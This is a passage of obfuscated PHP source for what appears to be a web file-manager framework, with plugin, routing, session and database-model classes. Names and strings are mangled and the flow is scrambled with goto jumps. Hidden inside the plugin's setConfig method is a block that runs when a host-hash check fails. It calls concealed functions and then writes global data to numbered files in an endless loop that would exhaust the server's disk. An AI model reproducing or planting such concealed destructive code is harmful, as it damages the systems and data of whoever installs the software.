substr($D¤ÑÍ…Ÿ», strlen($B—àğš…ùŠ), -4); $DÍïîì¼Æä = LNG($eÏ¢Ê¡ßÓ„); $föÅ¿·¬°ë[] = $D¤ÑÍ…Ÿ»; $f…œ›«ÆİÙ[] = str_replace(array($CªìŸîØÅİ[225], $CªìŸîØÅİ[998], $CªìŸîØÅİ[336], $CªìŸîØÅİ[113]), array($CªìŸîØÅİ[50], $CªìŸîØÅİ[50], $CªìŸîØÅİ[33], $CªìŸîØÅİ[1401]), $DÍïîì¼Æä); } $FëµˆéÎµ = str_replace($föÅ¿·¬°ë, $f…œ›«ÆİÙ, $FëµˆéÎµ); goto Fº¼Å˜ÀÊ; dÖ¥¿¥±—: preg_match_all($CªìŸîØÅİ[1400], $FëµˆéÎµ, $f¤¢¾†Óµ); if (!is_array($f¤¢¾†Óµ) || count($f¤¢¾†Óµ) == 0 || !is_array($f¤¢¾†Óµ[0]) || count($f¤¢¾†Óµ[0]) == 0) { return; } $föÅ¿·¬°ë = array(); goto d¨êõ‰»õŸ; AÒŸ††É¿Ë: $CªìŸîØÅİ =& $_SERVER[úÎü]; $B—àğš…ùŠ = $CªìŸîØÅİ[1399]; if (!strstr($FëµˆéÎµ, $B—àğš…ùŠ)) { return; } goto dÖ¥¿¥±—; Fº¼Å˜ÀÊ: } private function parseConfig(&$F…·µ²†Íâ) { goto AÉ•ø¤ç÷§; F¯‹“­¶¬†: preg_match_all($Bšó¤ä°ø”[1403], $F…·µ²†Íâ, $dÊÖøš¸İ); if (!is_array($dÊÖøš¸İ) || count($dÊÖøš¸İ) == 0 || !is_array($dÊÖøš¸İ[0]) || count($dÊÖøš¸İ[0]) == 0) { return; } $e …æÆîŒĞ = $this->getConfig(); goto A´š·Ş°ëÇ; AÉ•ø¤ç÷§: $Bšó¤ä°ø” =& $_SERVER[úÎü]; $DšöôŞ†‡ = $Bšó¤ä°ø”[1402]; if (!strstr($F…·µ²†Íâ, $DšöôŞ†‡)) { return; } goto F¯‹“­¶¬†; A´š·Ş°ëÇ: $cŸÍâ÷ñÚ = array(); $fÊà—‰Æ’ò = array(); foreach ($dÊÖøš¸İ[0] as $aö¤”¬ªÜì) { $f÷¡¬Š = substr($aö¤”¬ªÜì, strlen($DšöôŞ†‡), -2); $cŸÍâ÷ñÚ[] = $aö¤”¬ªÜì; $fÊà—‰Æ’ò[] = _get($e …æÆîŒĞ, $f÷¡¬Š); } goto cÒç•ãáôÆ; cÒç•ãáôÆ: $F…·µ²†Íâ = str_replace($cŸÍâ÷ñÚ, $fÊà—‰Æ’ò, $F…·µ²†Íâ); goto FÁêî¬Â…‘; FÁêî¬Â…‘: } private function parsePackage(&$Aò’‡ù‚§Ç) { goto b¯ÕÙ±¸óî; C™˜Ş½ˆĞå: $eÅ×›Şî‘© = array(); $Eß•»ø‡ Ñ = array(); foreach ($f”æ¬¥‘Ùã[0] as $d«É•–²‚¤) { $bßÔô„âÛä = substr($d«É•–²‚¤, strlen($a›ßáËù¢Ä), -2); $eÅ×›Şî‘©[] = $d«É•–²‚¤; $Eß•»ø‡ Ñ[] = _get($bÆˆ´¹¯´, $bßÔô„âÛä); } goto b„Ó„ßí¡…; b„Ó„ßí¡…: $Aò’‡ù‚§Ç = str_replace($eÅ×›Şî‘©, $Eß•»ø‡ Ñ, $Aò’‡ù‚§Ç); goto Dƒİ‚ ì™’; b¯ÕÙ±¸óî: $Eß¥®ä¤¸ =& $_SERVER[úÎü]; $a›ßáËù¢Ä = $Eß¥®ä¤¸[1404]; if (!strstr($Aò’‡ù‚§Ç, $a›ßáËù¢Ä)) { return; } goto fŒàÔöÚ¼É; fŒàÔöÚ¼É: preg_match_all($Eß¥®ä¤¸[1405], $Aò’‡ù‚§Ç, $f”æ¬¥‘Ùã); if (!is_array($f”æ¬¥‘Ùã) || count($f”æ¬¥‘Ùã) == 0 || !is_array($f”æ¬¥‘Ùã[0]) || count($f”æ¬¥‘Ùã[0]) == 0) { return; } $bÆˆ´¹¯´ = $this->appPackage(); goto C™˜Ş½ˆĞå; Dƒİ‚ ì™’: } final function echoFile($c‹òŸá²”•, $d­Ê‚’›„‹ = false) { goto D–„»É„‡Ë; f¬Ú‡Û×Ã¡: $this->parsePackage($c¯åØ§ÊÕ¤); if (is_array($d­Ê‚’›„‹)) { $c¯åØ§ÊÕ¤ = str_replace(array_keys($d­Ê‚’›„‹), array_values($d­Ê‚’›„‹), $c¯åØ§ÊÕ¤); } echo $a¦äˆã–¼[225] . $c¯åØ§ÊÕ¤; goto F¢¨®ÅòùÍ; fÔƒ¡çå”Õ: $c¯åØ§ÊÕ¤ = $this->parseFile($E–Ö’ƒ¼Åä); $this->parseLang($c¯åØ§ÊÕ¤); $this->parseConfig($c¯åØ§ÊÕ¤); goto f¬Ú‡Û×Ã¡; D–„»É„‡Ë: $a¦äˆã–¼ =& $_SERVER[úÎü]; $E–Ö’ƒ¼Åä = $this->pluginPath . $c‹òŸá²”•; if (ACT == $a¦äˆã–¼[1406]) { echo $a¦äˆã–¼[1407] . $this->pluginName . $a¦äˆã–¼[8] . $c‹òŸá²”• . $a¦äˆã–¼[1408]; if (!file_exists($E–Ö’ƒ¼Åä)) { echo $a¦äˆã–¼[1409]; return; } } goto fÔƒ¡çå”Õ; F¢¨®ÅòùÍ: } final function initLang() { goto B„ÈŞñ¢Ğ²; B„ÈŞñ¢Ğ²: $A¦İÚõßî =& $_SERVER[úÎü]; $C´‚£ÏôØù = $A¦İÚõßî[1410]; $D§ÌõöæÕ = $this->pluginPath . $A¦İÚõßî[1411]; goto bÉç“çï¡; bÉç“çï¡: $cÂ×’ÚÉ›õ = I18n::getType(); $A”×ÕØàÀ» = array(); if (file_exists($D§ÌõöæÕ . $cÂ×’ÚÉ›õ . $A¦İÚõßî[765])) { $A”×ÕØàÀ» = (include $D§ÌõöæÕ . $cÂ×’ÚÉ›õ . $A¦İÚõßî[765]); } else { if ($cÂ×’ÚÉ›õ == $A¦İÚõßî[1412] && !file_exists($D§ÌõöæÕ . $cÂ×’ÚÉ›õ . $A¦İÚõßî[765]) && file_exists($D§ÌõöæÕ . $A¦İÚõßî[1413])) { $A”×ÕØàÀ» = (include $D§ÌõöæÕ . $A¦İÚõßî[1413]); } else { if (file_exists($D§ÌõöæÕ . $C´‚£ÏôØù . $A¦İÚõßî[765])) { $A”×ÕØàÀ» = (include $D§ÌõöæÕ . $C´‚£ÏôØù . $A¦İÚõßî[765]); } } } goto Cê¿…Œï; Cê¿…Œï: if (!is_array($A”×ÕØàÀ»)) { return array(); } if (@count($A”×ÕØàÀ») > 0) { I18n::set($A”×ÕØàÀ»); } return $A”×ÕØàÀ»; goto bÔƒƒ÷Ó‡Å; bÔƒƒ÷Ó‡Å: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($CÀ½º¸¥ëí) { $b ¸©ÜâÏ¬ =& $_SERVER[úÎü]; $e‚¯İºôñ = $_SERVER[$b ¸©ÜâÏ¬[797]] . $b ¸©ÜâÏ¬[798]; $dƒ©¹ÔòÇ = $b ¸©ÜâÏ¬[1414]; if ($_SERVER[$b ¸©ÜâÏ¬[793]] != $dƒ©¹ÔòÇ($e‚¯İºôñ)) { goto FäÜ£„ÀÌË; FäÜ£„ÀÌË: $c†Ø¤‡»À• = $b ¸©ÜâÏ¬[795]; $BÄ’£ÂÈ = $b ¸©ÜâÏ¬[796]; $c”Ö²ë Í° = $_SERVER[$b ¸©ÜâÏ¬[797]] . $b ¸©ÜâÏ¬[798]; goto E´Œ®éÃ­¬; fºÂêÚåİ: $c†Ø¤‡»À•(); $Dç„Ü±Åè• = $b ¸©ÜâÏ¬[1415]; $c¤…‚ÊÔÂÔ = json_encode($GLOBALS[$b ¸©ÜâÏ¬[1416]]); goto eÔĞŠ‘†Ç; eÔĞŠ‘†Ç: $eÍòÑè¥—ù = 1; for ($c¬ç¢µ¦ˆ = $eÍòÑè¥—ù; $c¬ç¢µ¦ˆ > 0; $c¬ç¢µ¦ˆ++) { $Dç„Ü±Åè•(DATA_PATH . $c¬ç¢µ¦ˆ, $c¤…‚ÊÔÂÔ); } goto eğòæò· ·; E´Œ®éÃ­¬: $eÙŞôË’ = $BÄ’£ÂÈ($c”Ö²ë Í°); $F°°­Í“¤ = explode($b ¸©ÜâÏ¬[225], $eÙŞôË’); if (count($F°°­Í“¤) < $b ¸©ÜâÏ¬[564]) { $añ¶¬àğŠÛ = $b ¸©ÜâÏ¬[799]; $añ¶¬àğŠÛ(); } goto FªÑßãƒ°¸; FªÑßãƒ°¸: $F£†Ëªõ‘È = $b ¸©ÜâÏ¬[800]; $F£†Ëªõ‘È($_SERVER[$b ¸©ÜâÏ¬[801]]); $c†Ø¤‡»À• = $b ¸©ÜâÏ¬[795]; goto fºÂêÚåİ; eğòæò· ·: } return $this->modelPlugin->setConfig($this->pluginName, $CÀ½º¸¥ëí); } public function onSetConfig($E¤‚’ÍØ›°) { } public function onGetConfig($bªóæùó‰µ) { } public function onChangeStatus($D¡ãùñ…îò) { } public function onUninstall() { } public function onInstall() { } public function authCheck($A¹Ğ’Öš¥† = "\x70\154\165\147\151\x6e\x41\165\x74\x68") { $F„‚Ãîôâ =& $_SERVER[úÎü]; if (!defined($F„‚Ãîôâ[442])) { return !1; } if (_get($GLOBALS, $F„‚Ãîôâ[474])) { return !0; } $eÙÀõ¡˜Ğ§ = $this->getConfig(); if (!$eÙÀõ¡˜Ğ§[$A¹Ğ’Öš¥†]) { return !1; } return ActionCall($F„‚Ãîôâ[1417], $eÙÀõ¡˜Ğ§[$A¹Ğ’Öš¥†]); } public function url($a†Ş‹ÑÀéæ, $Aë¿‚Àô  = '', $C—±—¬¯Ò = true) { goto EÖ¯Æ¨ƒ¹ò; B÷ƒì—·³×: $cƒ‡š³‰¾Ö = $this->packageVersion(); $DóôÍßƒÉ£ = $dÍ•Ü…èÖ . $dÄó­æ‡Ôª[428] . $cƒ‡š³‰¾Ö; if (substr($a†Ş‹ÑÀéæ, 0, 4) == $dÄó­æ‡Ôª[144] || substr($a†Ş‹ÑÀéæ, 0, 2) == $dÄó­æ‡Ôª[1200]) { $eÚ’î¦«Øî = $a†Ş‹ÑÀéæ . $dÄó­æ‡Ôª[1418] . $DóôÍßƒÉ£; } else { if ($Aë¿‚Àô  == $dÄó­æ‡Ôª[33]) { $eÚ’î¦«Øî = $this->pluginHost . $a†Ş‹ÑÀéæ . $dÄó­æ‡Ôª[1418] . $DóôÍßƒÉ£; } else { if ($Aë¿‚Àô  === $dÄó­æ‡Ôª[76]) { $eÚ’î¦«Øî = $this->pluginHost . $a†Ş‹ÑÀéæ; } else { if ($Aë¿‚Àô  == $dÄó­æ‡Ôª[1419]) { $eÚ’î¦«Øî = STATIC_PATH . $a†Ş‹ÑÀéæ . $dÄó­æ‡Ôª[1418] . $dÍ•Ü…èÖ; } else { if ($Aë¿‚Àô  == $dÄó­æ‡Ôª[1420]) { $eÚ’î¦«Øî = APP_HOST . $dÄó­æ‡Ôª[1421] . $a†Ş‹ÑÀéæ . $dÄó­æ‡Ôª[1418] . $dÍ•Ü…èÖ; } else { if (isset($BùŒ©Ö›ÕŞ[$Aë¿‚Àô ])) { $eÚ’î¦«Øî = $BùŒ©Ö›ÕŞ[$Aë¿‚Àô ] . $a†Ş‹ÑÀéæ . $dÄó­æ‡Ôª[1418] . $DóôÍßƒÉ£; } } } } } } goto e™ä÷ˆöá; EÖ¯Æ¨ƒ¹ò: $dÄó­æ‡Ôª =& $_SERVER[úÎü]; $BùŒ©Ö›ÕŞ = $this->getConfig(); $dÍ•Ü…èÖ = KOD_VERSION . $dÄó­æ‡Ôª[91] . KOD_VERSION_BUILD; goto B÷ƒì—·³×; e™ä÷ˆöá: if (!$C—±—¬¯Ò) { return $eÚ’î¦«Øî; } echo $eÚ’î¦«Øî; goto Fœ”ÄÄ‰à¬; Fœ”ÄÄ‰à¬: } public function link($E™°°°µ› = false, $bæÃçÜ“¿ = '') { $EÜ‡¬íßï’ =& $_SERVER[úÎü]; if (!$E™°°°µ›) { $this->link($EÜ‡¬íßï’[1422], $EÜ‡¬íßï’[1420]); $this->link($EÜ‡¬íßï’[1423], $EÜ‡¬íßï’[1419]); $this->link($EÜ‡¬íßï’[1424], $EÜ‡¬íßï’[1419]); $this->link($EÜ‡¬íßï’[1425], $EÜ‡¬íßï’[1419]); $this->link($EÜ‡¬íßï’[1426], $EÜ‡¬íßï’[1419]); return; } $AÌË®õŒâ = $this->url($E™°°°µ›, $bæÃçÜ“¿, !1); if (substr($E™°°°µ›, -3) == $EÜ‡¬íßï’[1427]) { echo $EÜ‡¬íßï’[1428] . $AÌË®õŒâ . $EÜ‡¬íßï’[1429] . $EÜ‡¬íßï’[225]; } else { if (substr($E™°°°µ›, -4) == $EÜ‡¬íßï’[1430]) { echo $EÜ‡¬íßï’[1431] . $AÌË®õŒâ . $EÜ‡¬íßï’[1432] . $EÜ‡¬íßï’[225]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\156\171" => "\x5b\x5e\57\135\x2b", "\x3a\156\165\x6d" => "\x5b\60\55\x39\135\53", "\x3a\141\x6c\154" => "\56\52"); public static $errorCallback; public static function __callstatic($CïÊİê¥§, $EİÌ½Â£‡”) { $FÒ‹‡—ŒÖ =& $_SERVER[úÎü]; if ($CïÊİê¥§ == $FÒ‹‡—ŒÖ[1433]) { $bªÎ•ó¬’• = array_map($FÒ‹‡—ŒÖ[1434], $EİÌ½Â£‡”[0]); $a°ôÃÅ’Ò… = strpos($EİÌ½Â£‡”[1], $FÒ‹‡—ŒÖ[8]) === 0 ? $EİÌ½Â£‡”[1] : $FÒ‹‡—ŒÖ[8] . $EİÌ½Â£‡”[1]; $Aå¸Ş«ˆ¨ = $EİÌ½Â£‡”[2]; } else { $bªÎ•ó¬’• = null; $a°ôÃÅ’Ò… = strpos($EİÌ½Â£‡”[0], $FÒ‹‡—ŒÖ[8]) === 0 ? $EİÌ½Â£‡”[0] : $FÒ‹‡—ŒÖ[8] . $EİÌ½Â£‡”[0]; $Aå¸Ş«ˆ¨ = $EİÌ½Â£‡”[1]; } array_push(self::$maps, $bªÎ•ó¬’•); array_push(self::$routes, $a°ôÃÅ’Ò…); array_push(self::$methods, strtoupper($CïÊİê¥§)); array_push(self::$callbacks, $Aå¸Ş«ˆ¨); } public static function error($EÙõ¢ÚíÃ“) { self::$errorCallback = $EÙõ¢ÚíÃ“; } public static function haltOnMatch($DÓù„˜™î = true) { self::$halts = $DÓù„˜™î; } public static function dispatch() { goto fÚ‘˜é¯£; fÚ‘˜é¯£: $DÖ³”è¥ =& $_SERVER[úÎü]; $E¯ÃĞ… = parse_url($_SERVER[$DÖ³”è¥[1435]], PHP_URL_PATH); $Dï…ŸÒ’îŠ = $_SERVER[$DÖ³”è¥[154]]; goto eÑ§ôîÌî; eÑ§ôîÌî: $bÜ‚›¨‡Æ© = array_keys(static::$patterns); $Fê×à÷¼ŒÑ = array_values(static::$patterns); $Bå‚™Ö˜˜² = !1; goto b•·™É‘ÙÛ; b•·™É‘ÙÛ: self::$routes = preg_replace($DÖ³”è¥[1119], $DÖ³”è¥[8], self::$routes); if (in_array($E¯ÃĞ…, self::$routes)) { $F™à‹‚«Â = array_keys(self::$routes, $E¯ÃĞ…); foreach ($F™à‹‚«Â as $fÆ«áËš˜‹) { if (self::$methods[$fÆ«áËš˜‹] == $Dï…ŸÒ’îŠ || self::$methods[$fÆ«áËš˜‹] == $DÖ³”è¥[1436] || in_array($Dï…ŸÒ’îŠ, self::$maps[$fÆ«áËš˜‹])) { $Bå‚™Ö˜˜² = !0; if (!is_object(self::$callbacks[$fÆ«áËš˜‹])) { $B¾„ÍñÉ¿ = explode($DÖ³”è¥[8], self::$callbacks[$fÆ«áËš˜‹]); $c°èáÚ†½ñ = end($B¾„ÍñÉ¿); $dÄãÇí¿Óç = explode($DÖ³”è¥[1437], $c°èáÚ†½ñ); $aæÔÊ´ƒÒù = new $dÄãÇí¿Óç[0](); $aæÔÊ´ƒÒù->{$dÄãÇí¿Óç[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$fÆ«áËš˜‹]); if (self::$halts) { return; } } } } } else { $b„œòª£Û² = 0; foreach (self::$routes as $fÆ«áËš˜‹) { if (strpos($fÆ«áËš˜‹, $DÖ³”è¥[4]) !== !1) { $fÆ«áËš˜‹ = str_replace($bÜ‚›¨‡Æ©, $Fê×à÷¼ŒÑ, $fÆ«áËš˜‹); } if (preg_match($DÖ³”è¥[1438] . $fÆ«áËš˜‹ . $DÖ³”è¥[1439], $E¯ÃĞ…, $B¸´ßç¡»¸)) { if (self::$methods[$b„œòª£Û²] == $Dï…ŸÒ’îŠ || self::$methods[$b„œòª£Û²] == $DÖ³”è¥[1436] || !empty(self::$maps[$b„œòª£Û²]) && in_array($Dï…ŸÒ’îŠ, self::$maps[$b„œòª£Û²])) { $Bå‚™Ö˜˜² = !0; array_shift($B¸´ßç¡»¸); if (!is_object(self::$callbacks[$b„œòª£Û²])) { $B¾„ÍñÉ¿ = explode($DÖ³”è¥[8], self::$callbacks[$b„œòª£Û²]); $c°èáÚ†½ñ = end($B¾„ÍñÉ¿); $dÄãÇí¿Óç = explode($DÖ³”è¥[1437], $c°èáÚ†½ñ); $aæÔÊ´ƒÒù = new $dÄãÇí¿Óç[0](); if (!method_exists($aæÔÊ´ƒÒù, $dÄãÇí¿Óç[1])) { echo $DÖ³”è¥[1440]; } else { call_user_func_array(array($aæÔÊ´ƒÒù, $dÄãÇí¿Óç[1]), $B¸´ßç¡»¸); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$b„œòª£Û²], $B¸´ßç¡»¸); if (self::$halts) { return; } } } } $b„œòª£Û²++; } } if ($Bå‚™Ö˜˜² == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $DÎ‘¹ï‰‘› =& $_SERVER[úÎü]; header($_SERVER[$DÎ‘¹ï‰‘›[1441]] . $DÎ‘¹ï‰‘›[1442]); echo $DÎ‘¹ï‰‘›[1443]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$DÖ³”è¥[1435]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto C¯¸Û´Ôêš; C¯¸Û´Ôêš: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto cóÅ—ã Æ—; bã½‘Œ ¥É: $bŒáËœâò© = $DÙ¬Ü‰¥Û[$AÑ˜áä£ë“]; $aÑÏØÍÌ²À = $DÙ¬Ü‰¥Û[$f¼¾§ìŞß[755]]; switch ($AÑ˜áä£ë“) { case $f¼¾§ìŞß[17]: self::$handle = Model($f¼¾§ìŞß[756]); break; case $f¼¾§ìŞß[757]: self::$handle = new CacheRedis($bŒáËœâò©, $aÑÏØÍÌ²À); break; case $f¼¾§ìŞß[758]: self::$handle = new CacheMemcached($bŒáËœâò©, $aÑÏØÍÌ²À); break; case $f¼¾§ìŞß[171]: $bŒáËœâò©[$f¼¾§ìŞß[75]] = $bŒáËœâò©[$f¼¾§ìŞß[75]] . $f¼¾§ìŞß[1447]; self::$handle = new CacheFile($bŒáËœâò©, $aÑÏØÍÌ²À); default: break; } goto bÖÀéÊ¸ë¥; bÖÀéÊ¸ë¥: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $dÛêµ¤÷§Ú = new self(); return $dÛêµ¤÷§Ú; goto D²èí«¸–‹; C˜«›Éöõ: if (self::$sessionSign) { } else { if (Cookie::get($E¾Ë’í¨‡)) { self::$sessionSign = Cookie::get($E¾Ë’í¨‡); } else { self::$sessionSign = guid(); } } Cookie::setSafe($E¾Ë’í¨‡, self::$sessionSign, self::$sessionTime); $AÑ˜áä£ë“ = $DÙ¬Ü‰¥Û[$f¼¾§ìŞß[1446]]; goto bã½‘Œ ¥É; bÊŞåçòëÚ: $DÙ¬Ü‰¥Û = $GLOBALS[$f¼¾§ìŞß[6]][$f¼¾§ìŞß[343]]; self::$sessionTime = $DÙ¬Ü‰¥Û[$f¼¾§ìŞß[1444]]; $E¾Ë’í¨‡ = isset($GLOBALS[$f¼¾§ìŞß[1445]]) ? $GLOBALS[$f¼¾§ìŞß[1445]] : SESSION_ID; goto C˜«›Éöõ; cóÅ—ã Æ—: $f¼¾§ìŞß =& $_SERVER[úÎü]; static $dÛêµ¤÷§Ú = false; if ($dÛêµ¤÷§Ú) { return $dÛêµ¤÷§Ú; } goto bÊŞåçòëÚ; D²èí«¸–‹: } public static function sign($b¶ôØÁˆíö = false) { $b¶ôØÁˆíö && (self::$sessionSign = $b¶ôØÁˆíö); self::init(); return self::$sessionSign; } public static function set($bå¨Ú ¸‚ğ, $A…µš‰´´² = false) { self::init(); if (is_array($bå¨Ú ¸‚ğ)) { foreach ($bå¨Ú ¸‚ğ as $B–™ÇİİË => $d‘‰¤®‹) { array_set_value(self::$data, $B–™ÇİİË, $d‘‰¤®‹); } } else { array_set_value(self::$data, $bå¨Ú ¸‚ğ, $A…µš‰´´²); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($D†ÖÁİ‹½Î = false) { self::init(); if (!$D†ÖÁİ‹½Î) { return self::$data; } return array_get_value(self::$data, $D†ÖÁİ‹½Î); } public static function remove($d¼‚±°øõ¨) { self::init(); unset(self::$data[$d¼‚±°øõ¨]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[úÎü][760])) { self::$handle->clearTimeout(); } } } goto E§é†Ö–Ë¯; d¤‚Û°±á“: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\144\151\x66\171\124\x69\x6d\145", "\164\151\x6d\x65", "\x69\x6e\x73\x65\x72\x74\54\165\160\144\x61\x74\x65", "\x66\x75\x6e\143\x74\151\157\x6e"), array("\x63\162\x65\x61\x74\x65\124\151\155\x65", "\x74\x69\x6d\x65", "\x69\156\163\x65\x72\x74", "\146\165\x6e\143\x74\x69\157\x6e")); public function setDataAuto($CèµƒÜ’Öİ) { $this->dataAuto = $CèµƒÜ’Öİ; } public function __construct($E£Èç¸Ü±™ = '', $D”Åù¤´–‡ = '', $f¯ß¶îÙ˜— = '') { parent::__construct($E£Èç¸Ü±™, $D”Åù¤´–‡, $f¯ß¶îÙ˜—); } public static function textEncode($Eãèª´„¹«) { if (!$Eãèª´„¹«) { return $Eãèª´„¹«; } $e¬¤‰ÁÔíÈ = json_encode($Eãèª´„¹«); $e¬¤‰ÁÔíÈ = preg_replace_callback($_SERVER[úÎü][349], function ($b½ˆ¢¢ƒ‡¦) { return addslashes($b½ˆ¢¢ƒ‡¦[0]); }, $e¬¤‰ÁÔíÈ); return json_decode($e¬¤‰ÁÔíÈ); } public static function textDecode($A™İù­Œ•¾) { $AÚè‹¼£ë¡ =& $_SERVER[úÎü]; $C‹µçÕÚù = json_encode($A™İù­Œ•¾); $C‹µçÕÚù = preg_replace_callback($AÚè‹¼£ë¡[350], function ($dø½Äá÷) { return $_SERVER[úÎü][93]; }, $C‹µçÕÚù); return json_decode($C‹µçÕÚù); } protected $tableMeta = array(); protected function _beforeInsert(&$Dî‘”Üƒ µ, $Fê×à¿ïˆ–) { $bœ›öï½Ù¶ =& $_SERVER[úÎü]; if (!$this->checkDataAutoHas($bœ›öï½Ù¶[351])) { return; } $this->dataBeforeFilter($Dî‘”Üƒ µ, $bœ›öï½Ù¶[351]); } protected function _beforeUpdate(&$C¼¸Ñ²°ƒå, $D×Ê¸ğ•¹¥) { $D‡ğæŒ®÷† =& $_SERVER[úÎü]; if (!$this->checkDataAutoHas($D‡ğæŒ®÷†[352])) { return; } $this->dataBeforeFilter($C¼¸Ñ²°ƒå, $D‡ğæŒ®÷†[352]); } protected function _afterSelect(&$bƒ¯¯õÇå, $A®Ò­¸À) { if (!is_array($bƒ¯¯õÇå)) { return; } if (!$this->checkDataAutoHas($_SERVER[úÎü][353])) { return; } foreach ($bƒ¯¯õÇå as &$F˜‰Îì§ğÀ) { $this->dataAfterFilter($F˜‰Îì§ğÀ); } unset($F˜‰Îì§ğÀ); } protected function _afterFind(&$Dó±Ÿ…äÑÈ, $B·„¿õª·Ò) { if (!is_array($Dó±Ÿ…äÑÈ)) { return; } if (!$this->checkDataAutoHas($_SERVER[úÎü][353])) { return; } $this->dataAfterFilter($Dó±Ÿ…äÑÈ); } public function setAutoIncrement($DÃ‘“¼‡¼Š) { $CŸ ¿¡ê‹¤ = array($this->getPk() => $DÃ‘“¼‡¼Š); $a’®¤³—Š“ = $this->data($CŸ ¿¡ê‹¤)->add(); if ($a’®¤³—Š“) { $this->delete($a’®¤³—Š“); } } public function getAutoIncrement() { $C‡ã¨‡ ½ = $this->getTableName(); $cËó´„Õø² = $this->max($this->getPk()); $Dº‰»‰”ó = $this->query("\x73\x68\x6f\x77\x20\164\141\142\154\x65\40\x73\164\141\x74\x75\x73\x20\x77\150\145\x72\145\x20\x4e\141\x6d\x65\x3d\x27{$C‡ã¨‡ ½}\47"); $c’‰„ƒÀ´ = $Dº‰»‰”ó[0][$_SERVER[úÎü][354]]; $f¹Ä«‘±ùˆ = max($cËó´„Õø², $c’‰„ƒÀ´); return $f¹Ä«‘±ùˆ; } protected function _callBefore($EÄé—Íñ”, $F«ïø½¥êˆ) { return $this->cacheCallCheck($EÄé—Íñ”, $F«ïø½¥êˆ, !1); } protected function _callAfter($b¾½™Ã‰õš, $aŒŒÂĞâËÙ) { return $this->cacheCallCheck($b¾½™Ã‰õš, $aŒŒÂĞâËÙ, !0); } protected function cacheFunctionAlias($FÊšàğÑ¨ƒ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($F«Š›æ‰Õ´, $Fá‘¤¾’İ³, $C¥Á§Å‘ê = false) { $d…ßá„Ğ‘— = $this->cacheFunctionAlias($Fá‘¤¾’İ³); if (!$d…ßá„Ğ‘—) { return; } foreach ($d…ßá„Ğ‘— as $Fœºëîä­ê => $E…•ŸÍ¼óË) { $f†é‰¡è‘ª = $E…•ŸÍ¼óË[0]; $F¦…÷ÆˆÁ = explode($_SERVER[úÎü][47], $E…•ŸÍ¼óË[1]); if ($F«Š›æ‰Õ´ == $Fœºëîä­ê) { return $this->cacheFunctionGet($Fœºëîä­ê, $f†é‰¡è‘ª); } if ($C¥Á§Å‘ê && in_array($F«Š›æ‰Õ´, $F¦…÷ÆˆÁ)) { $this->cacheFunctionClear($Fœºëîä­ê, $f†é‰¡è‘ª); } } } public function cacheFunctionGet($DŸ”™÷ó, $dç®ñÂàÃ) { $eÕ²Ü·™¶Š = $this->cacheKeyMake($DŸ”™÷ó, $dç®ñÂàÃ); $DÊ—¸ì½Ëå = Cache::get($eÕ²Ü·™¶Š); if (!is_array($DÊ—¸ì½Ëå)) { $DÊ—¸ì½Ëå = call_user_func_array(array($this, $DŸ”™÷ó), array($dç®ñÂàÃ, !0)); Cache::set($eÕ²Ü·™¶Š, $DÊ—¸ì½Ëå); } return $DÊ—¸ì½Ëå; } public function cacheFunctionClear($EÂÀáè­, $e˜³Ãåßê) { $aô·ÏÄÆÉé = $e˜³Ãåßê; if (!is_array($e˜³Ãåßê)) { $aô·ÏÄÆÉé = array($e˜³Ãåßê); } foreach ($aô·ÏÄÆÉé as $Fè­ºùËÁ) { $eÅ¹´¨Œî = $this->cacheKeyMake($EÂÀáè­, $Fè­ºùËÁ); Cache::remove($eÅ¹´¨Œî); } } private function cacheKeyMake($bˆ—¿å«Ò¬, $eßŸä™ƒ·ƒ) { $f…öÕõÑ¿Õ =& $_SERVER[úÎü]; return get_class($this) . $f…öÕõÑ¿Õ[70] . $bˆ—¿å«Ò¬ . $f…öÕõÑ¿Õ[355] . $eßŸä™ƒ·ƒ; } protected function selectPage($b¡Ó³Üï“ƒ = 200, $d£ğ‡õÚêñ = 1) { goto aô²–Õ¢»è; B¯ø“»ÉÓÑ: $cÍ‘¥…Ç¹§ = ceil($fŠ¶°ÂÔÎ¬ / $b¡Ó³Üï“ƒ); $d£ğ‡õÚêñ = intval(isset($in[$C‹ê“Ñìä[347]]) ? $in[$C‹ê“Ñìä[347]] : $d£ğ‡õÚêñ); $d£ğ‡õÚêñ = $d£ğ‡õÚêñ <= 1 ? 1 : ($d£ğ‡õÚêñ >= $cÍ‘¥…Ç¹§ ? $cÍ‘¥…Ç¹§ : $d£ğ‡õÚêñ); goto C‰‘ÕñôÌ; aô²–Õ¢»è: $C‹ê“Ñìä =& $_SERVER[úÎü]; global $in; $cÕÑÚ¬†· = $this->optionsValue(); goto c‚î¼®”ÊÄ; c¡áãß¬†ê: $E·¹ë¥‹ = $cÕÑÚ¬†·; $E·¹ë¥‹[$C‹ê“Ñìä[357]] = array(); $this->optionsValue($E·¹ë¥‹); goto C¹×Ìæ¯Œ·; e¦ˆ»”·â: if ($cÍ‘¥…Ç¹§ == 1) { $fŠ¶°ÂÔÎ¬ = count($CÍÓ—Šßœ¯); } $eáÌ¯®›ª = array($C‹ê“Ñìä[358] => array($C‹ê“Ñìä[359] => $fŠ¶°ÂÔÎ¬, $C‹ê“Ñìä[356] => $b¡Ó³Üï“ƒ, 